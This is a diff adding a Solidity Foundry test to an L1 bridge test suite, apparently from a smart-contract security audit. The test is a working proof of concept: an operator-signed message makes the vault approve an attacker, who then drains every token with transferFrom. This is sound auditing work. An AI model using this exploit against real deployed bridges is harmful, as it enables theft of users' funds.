@@ -286,4 +286,29 @@ contract L1BossBridgeTest is Test {
         assertEq(userEndingBalance, vaultInitialBalance + userInitialBalance);
         assertEq(vaultEndingBalance, 0);
     }
+
+    function testMaliciousMessageSignatures() public {
+        uint256 vaultInitialBalance = 100e18;
+        deal(address(token), address(vault), vaultInitialBalance);
+
+        address attacker = makeAddr("attacker");
+
+        bytes memory message = abi.encode(
+            address(vault),
+            0,
+            abi.encodeCall(vault.approveTo, (attacker, vaultInitialBalance))
+        );
+
+        (uint8 v, bytes32 r, bytes32 s) = _signMessage(message, operator.key);
+
+        tokenBridge.sendToL1(v, r, s, message);
+        vm.prank(attacker);
+        token.transferFrom(address(vault), attacker, vaultInitialBalance);
+
+        uint256 attackerBalance = token.balanceOf(attacker);
+        uint256 vaultEndingBalance = token.balanceOf(address(vault));
+
+        assertEq(attackerBalance, vaultInitialBalance);
+        assertEq(vaultEndingBalance, 0);
+    }
 }
